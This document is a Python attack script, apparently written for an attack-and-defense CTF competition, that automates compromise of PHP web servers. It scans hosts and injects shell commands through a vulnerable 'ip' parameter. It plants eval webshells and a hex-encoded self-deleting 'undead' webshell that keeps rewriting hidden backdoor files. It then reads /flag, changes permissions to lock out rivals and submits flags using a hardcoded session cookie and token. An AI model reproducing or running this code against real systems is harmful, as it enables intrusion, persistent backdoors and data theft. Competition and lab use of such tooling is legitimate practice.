import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from time import sleep
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning

'''
用rce上传一句话木马，再上传不死马
'''
# 精确屏蔽 InsecureRequestWarning 警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# 配置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# 配置参数
IP_RANGE = range(228, 230)
PORTS = [80]  # 可扩展常见Web端口
TIMEOUT = 3
THREADS = 20
FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
QUESTION_ID = "90122"
mayiju1 = ".index.php"
mayiju2 = "---.php"
ma1 = ".nodead.php"
ma2 = ".index2.php"


def process_host():
    """并发探活，返回可达IP列表"""
    live_ips = []
    base_ips = [f"192.168.{i}.2" for i in IP_RANGE]

    def check_ip(ip):
        for port in PORTS:
            try:
                r = requests.get(f"http://{ip}:{port}", timeout=TIMEOUT)
                if 200 <= r.status_code < 500:  # 视为存活
                    logging.info(f"{ip}:{port} alive")
                    return ip  # 只要有一个端口成功即认为存活
            except:
                continue
        return None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(check_ip, ip): ip for ip in base_ips}
        for future in as_completed(futures):
            result = future.result()
            if result:
                live_ips.append(result)

    # 写入文件（可选）
    with open("自动_ip.txt", "w", encoding="utf-8") as f:
        for ip in live_ips:
            f.write(ip + "\n")
    return live_ips


def upload_muma1(ip_list):
    """并发向每个IP发送命令注入请求，提取flag"""
    # data = {"ip": "127.0.0.1;system('echo 3C3F7068700A69676E6F72655F757365725F61626F72742874727565293B200A7365745F74696D655F6C696D69742830293B202020200A756E6C696E6B285F5F46494C455F5F293B20200A0A2466696C65203D20272E696E646578322E706870273B200A24636F6465203D20273C3F706870206966286D643528245F4745545B2270617373225D293D3D22646230383864376664363134323264306464396632313532666435353031323722297B406576616C28245F504F53545B22636D64225D293B7D203F3E273B0A0A7768696C6520283129207B0A2020202066696C655F7075745F636F6E74656E7473282466696C652C2024636F6465293B200A2020202073797374656D2827746F756368202D6D202D642022323031382D30312D30312030303A30303A3030222027202E202466696C65293B200A2020202066696C655F7075745F636F6E74656E747328272E636F6E666967312E706870272C24636F6465293B0A2020202066696C655F7075745F636F6E74656E747328272E6170702E706870272C24636F6465293B0A2020202066696C655F7075745F636F6E74656E747328272E696E6465782E706870272C24636F6465293B0A2020202075736C6565702835303030293B200A7D0A3F3E |xxd -r -ps > /var/www/html/.nodead.php');"}

    data = {"ip": f"127.0.0.1;echo '<?php @eval($_REQUEST[\"cmd\"]);?>' > /var/www/html/{mayiju2}|echo '<?php @eval($_REQUEST[\"cmd\"]);?>' > /var/www/html/{mayiju1}|chmod +t /var/www/html/"}  # 根据实际调整payload
    upload_res = {}

    for ip in ip_list:
        url = f"http://{ip}"  # 若已知端口可拼接，否则可尝试常见端口
        try:
            if requests.post(url, data=data, timeout=TIMEOUT).status_code == 200:
                logging.info(f"{ip} 植入马成功")
                url = f"http://{ip}/{mayiju1}"
                if requests.get(url=url, timeout=0.5).status_code == 200:  # 访问不死马1，循环生成不死马2
                    logging.info(f"{ip} 马激活成功")
                    upload_res[ip] = url
                else:
                    logging.info(f"{ip} 马生成失败")
                    upload_res[ip] = None
            else:
                logging.info(f"{ip} 马上传失败")
                upload_res[ip] = None
        except Exception as e:
            logging.error(f"{ip} request failed: {e}")
            upload_res[ip] = None

    # 写入结果文件
    with open("upload_res.txt", "w", encoding="utf-8") as f:
        for ip, url in upload_res.items():
            f.write(f"{ip}:{url}\n")
        return upload_res


def upload_muma2(upload_res):
    '''上传16进制编码的不死马，返回木马url,有可能上传失败，就只用一句话吧'''
    upload_res2 = {}
    for ip, url in upload_res.items():
        if url:
            try:
                ##注意检查后面中有没有调用system()和echo()
                ##如果没有要加上完整的不死码应该是
                #payload = 'system("echo \'3c3f7068700d0a69676e6f72655f757365725f61626f72742874727565293b200d0a7365745f74696d655f6c696d69742830293b202020200d0a756e6c696e6b285f5f46494c455f5f293b20200d0a0d0a2466696c65203d20272e696e646578322e706870273b200d0a24636f6465203d20273c3f706870206966286d643528245f524551554553545b2270617373225d293d3d22646230383864376664363134323264306464396632313532666435353031323722297b406576616c28245f524551554553545b22636d64225d293b7d203f3e273b0d0a0d0a7768696c6520283129207b0d0a2020202066696c655f7075745f636f6e74656e7473282466696c652c2024636f6465293b200d0a2020202073797374656d2827746f756368202d6d202d642022323031382d30312d30312030303a30303a3030222027202e202466696c65293b200d0a2020202066696c655f7075745f636f6e74656e747328272e636f6e666967312e706870272c24636f6465293b0d0a2020202066696c655f7075745f636f6e74656e747328272e6170702e706870272c24636f6465293b0d0a2020202066696c655f7075745f636f6e74656e747328272e696e6465782e706870272c24636f6465293b0d0a2020202075736c6565702830293b200d0a7d0d0a3f3e\' |xxd -r -ps > /var/www/html/22.php)'
                ##"'system("echo 3c3f7068700d0a69676e6f72655f757365725f61626f72742874727565293b200d0a7365745f74696d655f6c696d69742830293b202020200d0a756e6c696e6b285f5f46494c455f5f293b20200d0a0d0a2466696c65203d20272e696e646578322e706870273b200d0a24636f6465203d20273c3f706870206966286d643528245f524551554553545b2270617373225d293d3d22646230383864376664363134323264306464396632313532666435353031323722297b406576616c28245f524551554553545b22636d64225d293b7d203f3e273b0d0a0d0a7768696c6520283129207b0d0a2020202066696c655f7075745f636f6e74656e7473282466696c652c2024636f6465293b200d0a2020202073797374656d2827746f756368202d6d202d642022323031382d30312d30312030303a30303a3030222027202e202466696c65293b200d0a2020202066696c655f7075745f636f6e74656e747328272e636f6e666967312e706870272c24636f6465293b0d0a2020202066696c655f7075745f636f6e74656e747328272e6170702e706870272c24636f6465293b0d0a2020202066696c655f7075745f636f6e74656e747328272e696e6465782e706870272c24636f6465293b0d0a2020202075736c6565702830293b200d0a7d0d0a3f3e |xxd -r -ps > /var/www/html/22.php)'"
                data = {'cmd': 'system(\"echo 3c3f7068700d0a69676e6f72655f757365725f61626f72742874727565293b200d0a7365745f74696d655f6c696d69742830293b202020200d0a756e6c696e6b285f5f46494c455f5f293b20200d0a0d0a2466696c65203d20272e696e646578322e706870273b200d0a24636f6465203d20273c3f706870206966286d643528245f524551554553545b2270617373225d293d3d22646230383864376664363134323264306464396632313532666435353031323722297b406576616c28245f524551554553545b22636d64225d293b7d203f3e273b0d0a0d0a7768696c6520283129207b0d0a2020202066696c655f7075745f636f6e74656e7473282466696c652c2024636f6465293b200d0a2020202073797374656d2827746f756368202d6d202d642022323031382d30312d30312030303a30303a3030222027202e202466696c65293b200d0a2020202066696c655f7075745f636f6e74656e747328272e636f6e666967312e706870272c24636f6465293b0d0a2020202066696c655f7075745f636f6e74656e747328272e6170702e706870272c24636f6465293b0d0a2020202066696c655f7075745f636f6e74656e747328272e696e6465782e706870272c24636f6465293b0d0a2020202075736c6565702830293b200d0a7d0d0a3f3e\" |xxd -r -ps > /var/www/html/.nodead.php);'}
                #data = {"cmd": "ls"}
                ''' 不死马内容为  pass=nima
                <?php
                    ignore_user_abort(true); 
                    set_time_limit(0);    
                    unlink(__FILE__);  
    
                    $file = '.index2.php'; 
                    $code = '<?php if(md5($_REQUEST["pass"])=="db088d7fd61422d0dd9f2152fd550127"){@eval($_REQUEST["cmd"]);} ?>';
    
                    while (1) {
                        file_put_contents($file, $code); 
                        system('touch -m -d "2018-01-01 00:00:00" ' . $file); 
                        file_put_contents('.config1.php',$code);
                        file_put_contents('.app.php',$code);
                        file_put_contents('.index.php',$code);
                        usleep(0); 
                    }
                    ?>
                '''
                r = requests.post(url=url, data=data, timeout=0.5)
                print(url, data)
                print(r.text)
                if requests.post(url=url, data=data, timeout=0.5).status_code == 200:
                    logging.info(f"{url} 不死马1植入成功")
                    ma1 = f"http://{ip}/.nodead.php"
                    if requests.get(url=ma1, timeout=0.5).status_code == 200:  # 访问不死马1，循环生成不死马2
                        ma2 = f"http://{ip}/.index2.php"
                        logging.info(f"{url} 不死马1激活，生成马2")
                        if requests.get(url=ma2, timeout=0.5) == 200:  # 激活不死马2
                            upload_res2[url] = ma2  # 保存马2路径
                            logging.info(f"{url} 不死马2成功")
                    else:
                        logging.error(f"{url} 不死马2失败")
                        upload_res2[url] = None
                else:
                    logging.error(f"{url} 不死马1失败")
                    upload_res2[url] = None
            except:
                logging.error(f"{url} 不死马失败")
                upload_res2[url] = None

        # 写入结果文件
        with open("upload_res2.txt", "w", encoding="utf-8") as f:
            for ip, url in upload_res2.items():
                f.write(f"{ip}:{url}\n")
            return upload_res2


def get_flag(upload_res2):
    """并发向每个木马url发送cmd,修改文件目录权限，提取flag"""
    flag_dict = {}
    payload = {
        # "pass": "nima",  # nima => db088d7fd61422d0dd9f2152fd550127  #如果上传不死马，加入这段
        "cmd": f"system('chmod +t /var/www/html|chmod 600 /var/www/html/{mayiju1}|cat /flag');",#设置对手文件夹权限
    }
    for ip, url in upload_res2.items():
        try:
            r = requests.post(url, data=payload, timeout=TIMEOUT)
            if r.status_code == 200:
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{url} found flag: {flag}")
                    flag_dict[url] = flag
                else:
                    logging.warning(f"{url} 200 but no flag")
                    flag_dict[url] = None
            else:
                logging.warning(f"{url} status {r.status_code}")
                flag_dict[url] = None
        except Exception as e:
            logging.error(f"{url} request failed: {e}")
            flag_dict[url] = None

    # 写入结果文件
    with open("自动_flag.txt", "w", encoding="utf-8") as f:
        for url, flag in flag_dict.items():
            f.write(f"{url}: {flag}\n")
    return flag_dict


def upload_flag(flag_dict):
    """上传所有获取到的flag到竞赛平台"""
    url = f"https://172.19.6.100/competition/api/contestants/match_plan/{QUESTION_ID}/question/awd"
    headers = {
        "Host": "172.19.6.100",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "\"Windows\"",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Google Chrome\";v=\"149\", \"Chromium\";v=\"149\", \"Not)A;Brand\";v=\"24\"",
        "Content-Type": "application/json",  # 关键：指定内容类型为 JSON
        "sec-ch-ua-mobile": "?0",
        "Origin": "https://172.19.6.100",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://172.19.6.100/competition_web/",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Cookie": "um_auth=1; sso_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiMjMzYWJiZjAtYzAzMS00MGQ4LWEzODctNDU5ODI5MGMyY2MzIiwiSUQiOjkwLCJVc2VybmFtZSI6InVzZXI4NiIsIk5pY2tOYW1lIjoidXNlcjg2IiwiSXNTdXBlciI6ZmFsc2UsIkxhc3RMb2dpbkF0IjoiMjAyNi0wNi0yMlQxNDozODo0Ni42NTIwOTM1MzUrMDg6MDAiLCJCdWZmZXJUaW1lIjowLCJpc3MiOiJxbVBsdXMiLCJuYmYiOjE3ODIxMDkzMjZ9.mwEuV2U0uRD3lkJafjjF16LWQznZ-HX4S8pOrdh0NsY; competition_session=MTc4MjEzMTQ0MXxOd3dBTkZaSk1sQkpSa0ZPVTFsVVVUVk5UalF6V2t4T1NqTlhNa2RUVDBwR1drUlJSVWhaU0VSWFYxTTNUekpSUjA0MVdWVTFVRUU9fN1s1wDuWpwQZPaUDaDctHB0ZsLD7t6R-j_uFzexANHW",
    }
    # 忽略证书验证（内网自签名）
    session = requests.Session()
    session.verify = False
    with open("自动_upload_res.txt", "w", encoding="utf-8") as f:
        f.write("提交flag失败\n")
    with open("自动_upload_res.txt", "a", encoding="utf-8") as f:
        for ip, flag in flag_dict.items():
            if flag:  # 字典里面有flag的才需要上传
                payload = {"answer": flag}
                try:
                    resp = session.post(url, json=payload, headers=headers, timeout=5)
                    # 解析返回消息（假设返回json格式）
                    if resp.status_code == 200:
                        msg = resp.json().get("msg", "unknown")
                        logging.info(f"{ip} upload success: {msg}")
                    else:
                        msg = resp.json().get("msg", "unknown")
                        logging.error(f"{ip} upload failed, status {resp.status_code}, {msg}")
                        # 写入结果文件
                        f.write(f"{ip} upload failed, status {resp.status_code}  {msg} 写入失败，自行写入\n")
                except Exception as e:
                    logging.error(f"{ip} upload exception: {e}")
                    f.write(f"{ip} error, status {resp.status_code}  {msg} 写入失败，自行写入{flag}\n")
                sleep(20)
            else:
                pass


if __name__ == "__main__":
    ip_list = process_host()
    # with open("ip.txt", "r", encoding="utf-8") as f:
    #     ip_list = f.readlines()
    upload_res = upload_muma1(ip_list)
    #upload_url = upload_muma2(upload_res)
    #flags = get_flag(upload_url)
    flags = get_flag(upload_res)
    if flags:  # 字典不为空，上传
        upload_flag(flags)
    else:
        logging.warning("No flags found.")
